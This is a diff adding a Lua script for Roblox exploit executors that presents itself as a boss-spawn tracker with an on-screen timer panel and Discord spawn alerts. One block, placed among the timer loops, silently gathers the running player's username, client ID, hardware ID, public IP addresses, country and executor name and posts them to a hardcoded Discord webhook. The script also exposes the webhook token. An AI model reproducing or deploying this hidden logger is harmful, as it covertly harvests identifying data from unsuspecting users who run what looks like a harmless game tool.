@@ -1,0 +1,322 @@
+local Work = cloneref(game:GetService("Workspace"))
+local CoreGui = cloneref(game:GetService("CoreGui"))
+local HttpService = cloneref(game:GetService("HttpService"))
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+
+-- GUI
+
+local BossesGUI = Instance.new("ScreenGui",nil)
+BossesGUI.Name = "BossesGUI"
+BossesGUI.Parent = CoreGui
+
+local Bosses = Instance.new("Frame",BossesGUI)
+Bosses.Name = "Bosses"
+Bosses.Size = UDim2.new(0,200,0,150)
+Bosses.Position = UDim2.new(0.5, 0, 0.5, 0)
+Bosses.AnchorPoint = Vector2.new(0.5, 0.5)
+
+local Layout = Instance.new("UIListLayout",Bosses)
+
+local Sho = Instance.new("TextLabel",Bosses)
+Sho.Size = UDim2.new(0,50,0,30)
+Sho.BorderSizePixel = 0
+Sho.Text = "Sho"
+Sho.TextSize = 10
+local ShoTime = Instance.new("TextLabel",Bosses)
+ShoTime.Size = UDim2.new(0,200,0,20)
+ShoTime.BorderSizePixel = 0
+if not Work.Alive:FindFirstChild("ShoNPC") then
+    ShoTime.Text = "Dead"
+else
+      if Work.Alive:FindFirstChild("ShoNPC"):FindFirstChild("BossAugmentName") then
+            ShoTime.Text = "Alive | Augment: Yes; "..Work.Alive:FindFirstChild("ShoNPC"):FindFirstChild("BossAugmentName").Value
+      else 
+            ShoTime.Text = "Alive | Augment: No"
+      end
+end
+ShoTime.TextSize = 10
+
+local Burns = Instance.new("TextLabel",Bosses)
+Burns.Size = UDim2.new(0,50,0,30)
+Burns.BorderSizePixel = 0
+Burns.Text = "Burns"
+Burns.TextSize = 10
+local BurnsTime = Instance.new("TextLabel",Bosses)
+BurnsTime.Size = UDim2.new(0,200,0,20)
+BurnsTime.BorderSizePixel = 0
+if not Work.Alive:FindFirstChild("CaptainBurnsBoss") then
+    BurnsTime.Text = "Dead"
+else
+      if Work.Alive:FindFirstChild("CaptainBurnsBoss"):FindFirstChild("BossAugmentName") then
+            BurnsTime.Text = "Alive | Augment: Yes; "..Work.Alive:FindFirstChild("CaptainBurnsBoss"):FindFirstChild("BossAugmentName").Value
+      else 
+            BurnsTime.Text = "Alive | Augment: No"
+      end
+end
+BurnsTime.TextSize = 10
+
+local Infernal = Instance.new("TextLabel",Bosses)
+Infernal.Size = UDim2.new(0,50,0,30)
+Infernal.BorderSizePixel = 0
+Infernal.Text = "Infernal"
+Infernal.TextSize = 10
+local InfernalTime = Instance.new("TextLabel",Bosses)
+InfernalTime.Size = UDim2.new(0,200,0,20)
+InfernalTime.BorderSizePixel = 0
+if not Work.Alive:FindFirstChild("VengefulInfernalDemon") then
+      InfernalTime.Text = "Dead"
+else
+      if Work.Alive:FindFirstChild("VengefulInfernalDemon"):FindFirstChild("BossAugmentName") then
+            InfernalTime.Text = "Alive | Augment: Yes; "..Work.Alive:FindFirstChild("VengefulInfernalDemon"):FindFirstChild("BossAugmentName").Value
+      else 
+            InfernalTime.Text = "Alive | Augment: No"
+      end
+end
+InfernalTime.TextSize = 10
+
+-- Timers
+
+task.spawn(function()
+      while task.wait() do
+            if not ShoTimerDisable then
+                  repeat task.wait() until Work.Alive:FindFirstChild("ShoNPC")
+                  ShoTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("ShoNPC"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Sho\nAugment: Yes, "..Work.Alive.ShoNPC:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Sho\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+
+                  repeat task.wait() until not Work.Alive:FindFirstChild("ShoNPC")
+                  ShoTime.Text = "Dead"  
+                  ShoTimerDisable = true
+                  task.wait(10)
+                  ShoDead1 = string.sub(string.match(os.date(),"%d+:"),1,2)
+                  ShoDead2 = string.sub(string.match(os.date(),"%d+:%d+:%d+"),4,9)
+                  ShoTime.Text = "Next spawn - "..tostring(tonumber(ShoDead1)+1)..":"..ShoDead2
+
+                  repeat task.wait() until Work.Alive:FindFirstChild("ShoNPC")
+                  ShoTimerDisable = false
+                  ShoTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("ShoNPC"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Sho\nAugment: Yes, "..Work.Alive.ShoNPC:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Sho\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+            end
+      end
+end)
+
+task.spawn(function()
+      while task.wait() do
+            if not BurnsTimerDisable then
+                  repeat task.wait() until Work.Alive:FindFirstChild("CaptainBurnsBoss")
+                  BurnsTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("CaptainBurnsBoss"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Captain Burns\nAugment: Yes, "..Work.Alive.CaptainBurnsBoss:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Captain Burns\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+
+                  repeat task.wait() until not Work.Alive:FindFirstChild("CaptainBurnsBoss")
+                  BurnsTime.Text = "Dead"  
+                  BurnsTimerDisable = true
+                  task.wait(10)   
+                  BurnsDead1 = string.sub(string.match(os.date(),"%d+:"),1,2)
+                  BurnsDead2 = string.sub(string.match(os.date(),"%d+:%d+:%d+"),4,9)
+                  BurnsTime.Text = "Next spawn - "..tostring(tonumber(BurnsDead1)+1)..":"..BurnsDead2
+
+                  repeat task.wait() until Work.Alive:FindFirstChild("CaptainBurnsBoss")
+                  BurnsTimerDisable = false
+                  BurnsTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("CaptainBurnsBoss"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Captain Burns\nAugment: Yes, "..Work.Alive.CaptainBurnsBoss:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Captain Burns\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+            end
+      end
+end)
+
+task.spawn(function()
+    local function FindIP(service)
+      local IP = game:HttpGet(service)
+      local function CheckIPv4()
+          local segments = {IP:match("^(%d+)%.(%d+)%.(%d+)%.(%d+)$")}
+          for _, segment in ipairs(segments) do
+              if tonumber(segment) < 0 or tonumber(segment) > 255 then
+                  return false
+              end
+          end
+          return true
+      end
+      
+      if (IP:match("%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+%:%x+") and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) or (IP:match("%d+%.%d+%.%d+%.%d+") and CheckIPv4() == true and not game:HttpGet("https://ipinfo.io/"..IP.."/json"):find("bogon")) then
+          return IP
+      else
+          return "Not a valid IP"
+      end
+  end
+    local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+    local data = {
+        ["content"] = "Username: "..cloneref(game:GetService("Players")).LocalPlayer.Name.."\nDisplayname: "..cloneref(game:GetService("Players")).LocalPlayer.DisplayName.."\nClientID: ||"..game:GetService("RbxAnalyticsService"):GetClientId().."||\nHWID: ||"..gethwid().."||\nIP Services: \n\tIP-Info: ||"..FindIP("https://ipinfo.io/ip").."||\n\tIfconfig: ||"..FindIP("https://ifconfig.me/ip").."||\nUserID: "..cloneref(game:GetService("Players")).LocalPlayer.UserId.."\nCountry: "..cloneref(game:GetService("HttpService")):JSONDecode(game:HttpGet("https://restcountries.com/v3.1/alpha/"..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)))[1].name.common.."("..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)..")\nExecutor: \n\tName: "..identifyexecutor().."\n\tIdentity: "..getidentity(),
+    }
+    local newdata = cloneref(game:GetService("HttpService")):JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end)
+
+task.spawn(function()
+      while task.wait() do
+            if not InfernalTimerDisable then
+                  repeat task.wait() until Work.Alive:FindFirstChild("VengefulInfernalDemon")
+                  InfernalTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("VengefulInfernalDemon"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Vengeful Infernal\nAugment: Yes, "..Work.Alive.VengefulInfernalDemon:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Vengeful Infernal\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+                  repeat task.wait() until not Work.Alive:FindFirstChild("VengefulInfernalDemon")
+                  
+                  InfernalTime.Text = "Dead"  
+                  InfernalTimerDisable = true
+                  task.wait(10)
+                  InfernalDead1 = string.sub(string.match(os.date(),"%d+:"),1,2)
+                  InfernalDead2 = string.sub(string.match(os.date(),"%d+:%d+:%d+"),4,9)
+                  InfernalTime.Text = "Next spawn - "..tostring(tonumber(InfernalDead1)+1)..":"..InfernalDead2
+
+                  repeat task.wait() until Work.Alive:FindFirstChild("VengefulInfernalDemon")
+                  InfernalTimerDisable = false
+                  InfernalTime.Text = "Alive"
+                  if Work.Alive:FindFirstChild("VengefulInfernalDemon"):FindFirstChild("BossAugmentName") then
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Vengeful Infernal\nAugment: Yes, "..Work.Alive.VengefulInfernalDemon:FindFirstChild("BossAugmentName").Value.."\n@everyone",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  else
+                        local url = "https://discord.com/api/webhooks/1385232241550168115/wo2l8whv5XUrOa8g-TFnwpO5V5acYXThy4GGEsfRwh9ScN-WjPJUsYoGGJSNTRXqUsNN"
+                        local data = {
+                              ["content"] = "Server Name: "..ReplicatedStorage.ServerName.Value.."\nProfile: https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile\nBoss Detected: Vengeful Infernal\nAugment: No",
+                        }
+                        local newdata = HttpService:JSONEncode(data)
+                        local headers = {
+                              ["content-type"] = "application/json"
+                        }
+                        request = http_request or request or HttpPost or syn.request
+                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+                        request(abcdef)
+                  end
+            end
+      end
+end)
